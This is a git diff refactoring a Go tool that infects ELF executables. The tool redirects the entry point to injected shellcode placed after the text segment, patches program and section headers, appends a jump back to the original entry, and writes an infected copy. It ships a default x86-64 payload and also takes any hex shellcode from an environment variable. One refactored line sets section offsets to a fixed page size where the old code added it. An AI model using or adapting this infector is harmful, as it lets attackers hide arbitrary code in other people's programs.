@@ -1,44 +1,42 @@
-/*
-[1] Increase p_shoff by PAGE_SIZE in the ELF header
-[2] Patch the insertion code (parasite) to jump to the entry point (original)
-[3] Locate the text segment program header
-[4] Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
-[5] Increase p_filesz by account for the new code (parasite)
-[6] Increase p_memsz to account for the new code (parasite)
-[7] For each phdr who's segment is after the insertion (text segment)
-[8] increase p_offset by PAGE_SIZE
-[9] For the last shdr in the text segment
-[10] increase sh_len by the parasite length
-[11] For each shdr who's section resides after the insertion
-[12] Increase sh_offset by PAGE_SIZE
-[13] Physically insert the new code (parasite) and pad to PAGE_SIZE, into the file - text segment p_offset + p_filesz (original)
-*/
-
 package main
 
 import (
 	"bytes"
 	"debug/elf"
+	"encoding/binary"
+	"encoding/hex"
+	"errors"
+	"flag"
 	"fmt"
 	"io"
 	"io/ioutil"
-	"os"
-	"encoding/binary"
-	"encoding/hex"
 	"log"
-	"flag"
-	"errors"
+	"os"
 	"strings"
 )
 
 const (
-	PAGE_SIZE     int    = 4096
+	PAGE_SIZE int = 4096
 )
 
+type enumIdent struct {
+	Endianness binary.ByteOrder
+	Arch       elf.Class
+}
+
 type targetBin struct {
-	payload bytes.Buffer			//payload to inject into binary
-	arch elf.Class					//elf binary ARCH (32 or 64-bit ?)
-	oFileHandle *os.File 			//file handle for binary
+	Filesz int64
+	Contents []byte
+	//tName string
+	Ident   []byte
+	EIdent  enumIdent
+	Hdr     interface{}
+	Shdrs   interface{}
+	Phdrs   interface{}
+	Fh      *os.File
+	Payload bytes.Buffer //payload to inject into binary
+
+	//oFileHandle *os.File 			//file handle for binary
 }
 
 var defaultPayload64 = []byte{
@@ -71,35 +69,35 @@ var defaultPayload64 = []byte{
 	0x5e,                         //pop    %rsi
 	0xba, 0x2a, 0x00, 0x00, 0x00, //mov    $0x2a,%edx
 	0x0f, 0x05, //syscall
-	0x5a,                         //pop    %rdx
-	0x5e,                         //pop    %rsi
-	0x5f,                         //pop    %rdi
+	0x5a, //pop    %rdx
+	0x5e, //pop    %rsi
+	0x5f, //pop    %rdi
 	/*
-	0xe8, 0x12, 0x00, 0x00, 0x00, //call   401061 <get_eip>
-	0x48, 0x83, 0xe8, 0x4f, 	//sub    $0x4f,%rax
-	0x48, 0x2d, 0xd1, 0x73, 0x01, 0x00, //sub    $0x173d1,%rax
-	0x48, 0x05, 0x20, 0x5b, 0x00, 0x00, //add    $0x5b20,%rax
-	0xff, 0xe0, //jmp    *%rax
+		0xe8, 0x12, 0x00, 0x00, 0x00, //call   401061 <get_eip>
+		0x48, 0x83, 0xe8, 0x4f, 	//sub    $0x4f,%rax
+		0x48, 0x2d, 0xd1, 0x73, 0x01, 0x00, //sub    $0x173d1,%rax
+		0x48, 0x05, 0x20, 0x5b, 0x00, 0x00, //add    $0x5b20,%rax
+		0xff, 0xe0, //jmp    *%rax
 
-	//0000000000401061 <get_eip>:
-	0x48, 0x8b, 0x04, 0x24, //mov    (%rsp),%rax
-	0xc3, //ret
+		//0000000000401061 <get_eip>:
+		0x48, 0x8b, 0x04, 0x24, //mov    (%rsp),%rax
+		0xc3, //ret
 	*/
 }
 
 func getPayloadFromEnv(p io.Writer, key string) (int, error) {
 	val, ok := os.LookupEnv(key)
-	if ! ok {
+	if !ok {
 		errorString := "Environmental variable " + key + " is not set"
 		return 0, errors.New(errorString)
 	}
-	
+
 	if val == "" {
 		errorString := "Environmental variable " + key + " contains no payload"
 		return 0, errors.New(errorString)
 	}
-	val =  strings.ReplaceAll(val, "\\x", "")
-	decoded, err :=  hex.DecodeString(val)
+	val = strings.ReplaceAll(val, "\\x", "")
+	decoded, err := hex.DecodeString(val)
 	if err != nil {
 		log.Fatal(err)
 	}
@@ -107,20 +105,9 @@ func getPayloadFromEnv(p io.Writer, key string) (int, error) {
 	return p.Write(decoded)
 }
 
-func isElf(e io.Reader) bool {
-	magic := make([]byte, 4)
-	e.Read(magic)
-	return !(magic[0] != '\x7f' || magic[1] != 'E' || magic[2] != 'L' || magic[3] != 'F')
-}
-
-func getClass(e io.Reader) elf.Class {
-	var ident [16]uint8
-	if _, err := e.oFileHandle.Seek(0, io.SeekStart); err != nil {
-		fmt.Println(err)
-		return
-	}
-	e.Read(ident[:])
-	return elf.Class(ident[elf.EI_CLASS])
+func (t *targetBin) isElf() bool {
+	t.Ident = t.Contents[:16]
+	return !(t.Ident[0] != '\x7f' || t.Ident[1] != 'E' || t.Ident[2] != 'L' || t.Ident[3] != 'F')
 }
 
 func checkError(e error) {
@@ -129,155 +116,148 @@ func checkError(e error) {
 	}
 }
 
-func (t *targetBin) infectBinary(debug bool) {
-	payload64 := t.payload.Bytes()
-	fStat, err := t.oFileHandle.Stat()
-	if err != nil {
-		fmt.Println(err)
-		return
-	}
+func (t *targetBin) infectBinary(debug bool) error {
+	var textSegStart64 uint64
+	var textSegEnd64 uint64
 
-	origFileBuf := make([]byte, fStat.Size())
-	
-	if _, err := t.oFileHandle.Seek(0, io.SeekStart); err != nil {
-		fmt.Println(err)
-		return
-	}
-	
-	if _, err := t.oFileHandle.Read(origFileBuf[:]); err != nil {
-		fmt.Println(err)
-		return
-	}
+	var oEntry64 uint64
+	var oShoff64 uint64
 
-	var elfHeader elf.Header64
-	origFileReader := bytes.NewReader(origFileBuf)
-	if err := binary.Read(origFileReader, binary.LittleEndian, &elfHeader); err != nil {
-		fmt.Println(err)
-		return
-	}
+	switch t.EIdent.Arch {
+	case elf.ELFCLASS64:
+		oEntry64 = t.Hdr.(*elf.Header64).Entry
+		oShoff64 = t.Hdr.(*elf.Header64).Shoff
 
-	//save the original entry point of the program and old offset of section hdr table
-	var oEntry uint64
-	var oShoff uint64
-	oEntry = elfHeader.Entry
-	oShoff = elfHeader.Shoff
+		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
 
-	//[1] increase the e_shoff by PAGESIZE
-	elfHeader.Shoff += uint64(PAGE_SIZE)
-
-	//[3]locate program header table
-	pHeaders := make([]elf.Prog64, elfHeader.Phnum)
-	phSectionReader := io.NewSectionReader(origFileReader, int64(elfHeader.Phoff), int64(elfHeader.Phentsize*elfHeader.Phnum))
-	if err := binary.Read(phSectionReader, binary.LittleEndian, pHeaders); err != nil {
-		fmt.Println(err)
-		return
-	}
-
-	/*
-		Need to save the index of the .text segment when you find it.
-		That way you can adjust the Memsz and Filesz by PAGESIZE
-	*/
-
-	var textNdx int
-	var textSegEnd uint64
-	var retStub []byte 
-	for i := 0; i < int(elfHeader.Phnum); i++ {
-		if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
-			//fmt.Printf("text segment offset @ 0x%x and is %d/%d", pHeaders[i].Off, i, elfHeader.Phnum)
-			textNdx = i
-			//[4]
-			elfHeader.Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
-			if debug {
-				fmt.Printf("[+] Modified entry point from 0x%x -> 0x%x\n", oEntry, elfHeader.Entry)
-			}
-			//[5] && [6]
-			textSegEnd = pHeaders[i].Off + pHeaders[i].Filesz
-			if debug {
-				fmt.Printf("[+] Text segment ends @ 0x%x\n", textSegEnd)
-				fmt.Printf("[+] Payload size pre-epilogue 0x%x\n", len(payload64))
-			}
-			
-			retStub = modEpilogue64(int32(len(payload64) + 5), elfHeader.Entry, oEntry)
-			payload64 = append(payload64, retStub...)
-
-			if debug {
-				fmt.Printf("[+] Payload size post-epilogue 0x%x\n", len(payload64))
-				
-				fmt.Println("------------------PAYLOAD----------------------------")
-				/*fmt.Print("[")
-				for _, h := range payload64 {
-					fmt.Printf("0x%02x ", h)
+		var textNdx int
+		var retStub []byte
+		pHeaders := t.Phdrs.([]elf.Prog64)
+		pNum := int(t.Hdr.(*elf.Header64).Phnum)
+		for i := 0; i < pNum; i++ {
+			if elf.ProgType(pHeaders[i].Type) == elf.PT_LOAD && (elf.ProgFlag(pHeaders[i].Flags) == (elf.PF_X | elf.PF_R)) {
+				textNdx = i
+				t.Hdr.(*elf.Header64).Entry = pHeaders[i].Vaddr + pHeaders[i].Filesz
+				textSegStart64 = pHeaders[i].Off
+				if debug {
+					fmt.Printf("[+] Modified entry point from 0x%x -> 0x%x\n", oEntry64, t.Hdr.(*elf.Header64).Entry)
 				}
-				fmt.Println("]")*/
-				fmt.Printf("%s", hex.Dump(payload64))
-				fmt.Println("--------------------END------------------------------")
+
+				textSegEnd64 = pHeaders[i].Off + pHeaders[i].Filesz
+				if debug {
+					fmt.Printf("[+] Text segment starts @ 0x%x\n", textSegStart64)
+					fmt.Printf("[+] Text segment ends @ 0x%x\n", textSegEnd64)
+					fmt.Printf("[+] Payload size pre-epilogue 0x%x\n", t.Payload.Len())
+				}
+
+				retStub = modEpilogue64(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry64)
+				t.Payload.Write(retStub)
+				if debug {
+					fmt.Printf("[+] Payload size post-epilogue 0x%x\n", t.Payload.Len())
+
+					fmt.Println("------------------PAYLOAD----------------------------")
+					fmt.Printf("%s", hex.Dump(t.Payload.Bytes()))
+					fmt.Println("--------------------END------------------------------")
+				}
+
+				t.Phdrs.([]elf.Prog64)[i].Memsz += uint64(t.Payload.Len())
+				t.Phdrs.([]elf.Prog64)[i].Filesz += uint64(t.Payload.Len())
+
+				if debug {
+					fmt.Println("[+] Generated and appended position independent return 2 OEP stub to payload")
+					fmt.Printf("[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n", t.Payload.Len())
+				}
 			}
-			pHeaders[i].Memsz += uint64(len(payload64))
-			pHeaders[i].Filesz += uint64(len(payload64))
-			if debug {
-				fmt.Println("[+] Generated and appended position independent return 2 OEP stub to payload")
-				fmt.Printf("[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n", len(payload64))
+		}
+
+		//Adjust the file offsets of each segment program header after the text segment program header
+		if debug {
+			fmt.Println("[+] Adjusting segments after text segment file offsets by ", PAGE_SIZE)
+		}
+		// [7] && [8]
+		for j := textNdx; j < pNum; j++ {
+			if pHeaders[textNdx].Off < pHeaders[j].Off {
+				if debug {
+					fmt.Println("Inceasing pHeader @ index ", j, PAGE_SIZE)
+				}
+				t.Phdrs.([]elf.Prog64)[j].Off += uint64(PAGE_SIZE)
 			}
+		}
+
+		if debug {
+			fmt.Println("[+] Increasing section header addresses if they come after text segment")
+		}
+		sectionHdrTable := t.Shdrs.([]elf.Section64)
+		sNum := int(t.Hdr.(*elf.Header64).Shnum)
+
+		for k := 0; k < sNum; k++ {
+			if sectionHdrTable[k].Off >= textSegEnd64 {
+				if debug {
+					fmt.Printf("[+] (%d) Updating sections past text segment @ addr 0x%x\n", k, sectionHdrTable[k].Addr)
+				}
+				t.Shdrs.([]elf.Section64)[k].Off = uint64(PAGE_SIZE)
+			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header64).Entry {
+				if debug {
+					fmt.Println("[+] Extending section header entry for text section by payload len.")
+				}
+				t.Shdrs.([]elf.Section64)[k].Size += uint64(t.Payload.Len())
+			}
+		}
+
+	case elf.ELFCLASS32:
+		return errors.New("Infection for 32-bit not supported yet")
+	}
+
+	infected := new(bytes.Buffer)
+
+	if h, ok := t.Hdr.(*elf.Header64); ok {
+		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
+			return err
 		}
 	}
 
-	//Adjust the file offsets of each segment program header after the text segment program header
-	if debug {
-		fmt.Println("[+] Adjusting segments after text segment file offsets by ", PAGE_SIZE)
-	}
-	// [7] && [8]
-	for j := textNdx; j < int(elfHeader.Phnum); j++ {
-		if pHeaders[textNdx].Off < pHeaders[j].Off {
-			if debug {
-				fmt.Println("Inceasing pHeader @ index ", j, PAGE_SIZE)
-			}
-			pHeaders[j].Off += uint64(PAGE_SIZE)
+	if h, ok := t.Hdr.(*elf.Header32); ok {
+		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
+			return err
 		}
 	}
 
-	// Elf header and program header table are adjacent to each other in the file
-	infectedBuf := new(bytes.Buffer)
-	binary.Write(infectedBuf, binary.LittleEndian, &elfHeader)
-	binary.Write(infectedBuf, binary.LittleEndian, pHeaders)
-
-	ephdrsz := int(elfHeader.Ehsize) + int(elfHeader.Phentsize * elfHeader.Phnum)
-	binary.Write(infectedBuf, binary.LittleEndian, origFileBuf[ephdrsz:])
-
-	//section header table comes after the data segment, we'll need a section reader
-	infectedReader := bytes.NewReader(infectedBuf.Bytes())
-	sectionTableReader := io.NewSectionReader(infectedReader, int64(oShoff), int64(elfHeader.Shentsize * elfHeader.Shnum))
-
-	sectionHdrTable := make([]elf.Section64, elfHeader.Shnum)
-	binary.Read(sectionTableReader, binary.LittleEndian, sectionHdrTable)
-
-	if debug {
-		fmt.Println("[+] Increasing section header addresses if they come after text segment")
-	}
-
-	for k := 0; k < int(elfHeader.Shnum); k++ {
-		if sectionHdrTable[k].Off >= textSegEnd {
-			if debug {
-				fmt.Printf("[+] (%d) Updating sections past text segment @ addr 0x%x\n", k, sectionHdrTable[k].Addr)
-			}
-			sectionHdrTable[k].Off += uint64(PAGE_SIZE)
-			//elfHeader.Entry here was previously adjust to be start of parasite
-		} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == elfHeader.Entry {
-			if debug {
-				fmt.Println("[+] Extending section header entry for text section by payload len.")
-			}
-			sectionHdrTable[k].Size += uint64(len(payload64))
+	if p, ok := t.Phdrs.([]elf.Prog64); ok {
+		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
+			return err
 		}
 	}
 
+	if p, ok := t.Phdrs.([]elf.Prog32); ok {
+		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
+			return err
+		}
+	}
+
+	var ephdrsz int
+	switch t.EIdent.Arch {
+	case elf.ELFCLASS64:
+		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize * t.Hdr.(*elf.Header64).Phnum)
+	case elf.ELFCLASS32:
+		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize * t.Hdr.(*elf.Header32).Phnum)
+	}
+
+	infected.Write(t.Contents[ephdrsz:])
 	infectedShdrTable := new(bytes.Buffer)
-	binary.Write(infectedShdrTable, binary.LittleEndian, sectionHdrTable)
+	switch t.EIdent.Arch {
+	case elf.ELFCLASS64:	
+		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section64))
+	case elf.ELFCLASS32:
+		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section32))
+	}
 
-	finalInfectionTwo := make([]byte, infectedBuf.Len() + int(PAGE_SIZE))
-	finalInfection := infectedBuf.Bytes()
 
-	copy(finalInfection[int(oShoff):], infectedShdrTable.Bytes())
+	finalInfectionTwo := make([]byte, infected.Len() + int(PAGE_SIZE))
+	finalInfection := infected.Bytes()
 
-	endOfInfection := int(textSegEnd)
+	copy(finalInfection[int(oShoff64):], infectedShdrTable.Bytes())
+
+	endOfInfection := int(textSegEnd64)
 
 	copy(finalInfectionTwo, finalInfection[:endOfInfection])
 
@@ -285,17 +265,125 @@ func (t *targetBin) infectBinary(debug bool) {
 		fmt.Println("[+] writing payload into the binary")
 	}
 	
-	copy(finalInfectionTwo[endOfInfection:], payload64)
+	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
 	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
-	infectedFileName := fmt.Sprintf("%s-infected", t.oFileHandle.Name())
+	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())
 
 	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err !=nil {
-		fmt.Println(err)
+		return err
 	}
-	
-	return
+	return nil
 }
 
+func (t *targetBin) enumIdent() error {
+	switch elf.Class(t.Ident[elf.EI_CLASS]) {
+	case elf.ELFCLASS64:
+		t.Hdr = new(elf.Header64)
+		t.EIdent.Arch = elf.ELFCLASS64
+	case elf.ELFCLASS32:
+		t.Hdr = new(elf.Header32)
+		t.EIdent.Arch = elf.ELFCLASS32
+	default:
+		return errors.New("Invalid Arch supplied -- only x86 and x64 ELF binaries supported")
+	}
+
+	switch elf.Data(t.Ident[elf.EI_DATA]) {
+	case elf.ELFDATA2LSB:
+		t.EIdent.Endianness = binary.LittleEndian
+	case elf.ELFDATA2MSB:
+		t.EIdent.Endianness = binary.BigEndian
+	default:
+		return errors.New("Binary possibly corrupted -- byte order unknown")
+	}
+
+	return nil
+}
+
+func (t *targetBin) mapHeader() error {
+	h := bytes.NewReader(t.Contents)
+	b := t.EIdent.Endianness
+
+	switch a := t.EIdent.Arch; a {
+	case elf.ELFCLASS64:
+		t.Hdr = new(elf.Header64)
+		if err := binary.Read(h, b, t.Hdr); err != nil {
+			return err
+		}
+	case elf.ELFCLASS32:
+		t.Hdr = new(elf.Header32)
+		if err := binary.Read(h, b, t.Hdr); err != nil {
+			return err
+		}
+	}
+	return nil
+}
+
+func (t *targetBin) getSectionHeaders() error {
+	if h, ok := t.Hdr.(*elf.Header64); ok {
+		start := int(h.Shoff)
+		end := int(h.Shentsize)*int(h.Shnum) + int(h.Shoff)
+		sr := bytes.NewBuffer(t.Contents[start:end])
+		t.Shdrs = make([]elf.Section64, h.Shnum)
+
+		if err := binary.Read(sr, t.EIdent.Endianness, t.Shdrs.([]elf.Section64)); err != nil {
+			return err
+		}
+	}
+
+	if h, ok := t.Hdr.(*elf.Header32); ok {
+		start := int(h.Shoff)
+		end := int(h.Shentsize)*int(h.Shnum) + int(h.Shoff)
+		sr := bytes.NewBuffer(t.Contents[start:end])
+		t.Shdrs = make([]elf.Section32, h.Shnum)
+
+		if err := binary.Read(sr, t.EIdent.Endianness, t.Shdrs.([]elf.Section32)); err != nil {
+			return err
+		}
+	}
+
+	return nil
+}
+
+func (t *targetBin) getProgramHeaders() error {
+	if h, ok := t.Hdr.(*elf.Header64); ok {
+		start := h.Phoff
+		end := int(h.Phentsize)*int(h.Phnum) + int(h.Phoff)
+		pr := bytes.NewBuffer(t.Contents[start:end])
+		t.Phdrs = make([]elf.Prog64, h.Phnum)
+
+		if err := binary.Read(pr, t.EIdent.Endianness, t.Phdrs.([]elf.Prog64)); err != nil {
+			return err
+		}
+	}
+
+	if h, ok := t.Hdr.(*elf.Header32); ok {
+		start := h.Phoff
+		end := int(h.Phentsize)*int(h.Phnum) + int(h.Phoff)
+		pr := bytes.NewBuffer(t.Contents[start:end])
+		t.Phdrs = make([]elf.Prog32, h.Phnum)
+
+		if err := binary.Read(pr, t.EIdent.Endianness, t.Phdrs.([]elf.Prog32)); err != nil {
+			return err
+		}
+	}
+
+	return nil
+}
+
+func (t *targetBin) getFileContents() error {
+	fStat, err := t.Fh.Stat()
+	if err != nil {
+		return err
+	}
+
+	t.Filesz = fStat.Size()
+	t.Contents = make([]byte, t.Filesz)
+
+	if _, err := t.Fh.Read(t.Contents); err != nil {
+		return err
+	}
+	return nil
+}
 
 func main() {
 
@@ -309,46 +397,68 @@ func main() {
 		flag.PrintDefaults()
 		log.Fatal("No target binary supplied")
 	}
+	t := new(targetBin)
 
-	oFileHandle, err := os.Open(*oFile)
+	fh, err := os.Open(*oFile)
 	if err != nil {
 		log.Fatal(err)
 	}
 
-	defer oFileHandle.Close()
-	
-	if !isElf(oFileHandle) {
+	t.Fh = fh
+	defer t.Fh.Close()
+
+	if err := t.getFileContents(); err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	if !t.isElf() {
 		fmt.Println("This is not an Elf binary")
 		return
 	}
-	
-	t := new(targetBin)
-	t.oFileHandle = oFileHandle
-	t.arch = getClass(oFileHandle)
 
-	
+	if err := t.enumIdent(); err != nil {
+		fmt.Println(err)
+		return
+	}
+
 	switch {
-	
+
 	case *pEnv != "" && *pFile != "":
 		flag.PrintDefaults()
 		return
 
 	case *pEnv == "" && *pFile == "":
-		if t.arch == elf.ELFCLASS64 {
-			t.payload.Write(defaultPayload64)
-		}else{
+		if t.EIdent.Arch == elf.ELFCLASS64 {
+			t.Payload.Write(defaultPayload64)
+		} else {
 			fmt.Println("No support for 32-bit payloads yet.")
 			return
 		}
 
 	case *pEnv != "":
-		if _,err := getPayloadFromEnv(&t.payload, *pEnv); err != nil {
+		if _, err := getPayloadFromEnv(&t.Payload, *pEnv); err != nil {
 			fmt.Println(err)
 			return
 		}
-	
+
 	case *pFile != "":
 		fmt.Println("Getting payload from an ELF binary .text segment is not yet supported")
+		return
+	}
+
+	if err := t.mapHeader(); err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	if err := t.getSectionHeaders(); err != nil {
+		fmt.Println(err)
+		return
+	}
+
+	if err := t.getProgramHeaders(); err != nil {
+		fmt.Println(err)
 		return
 	}
 
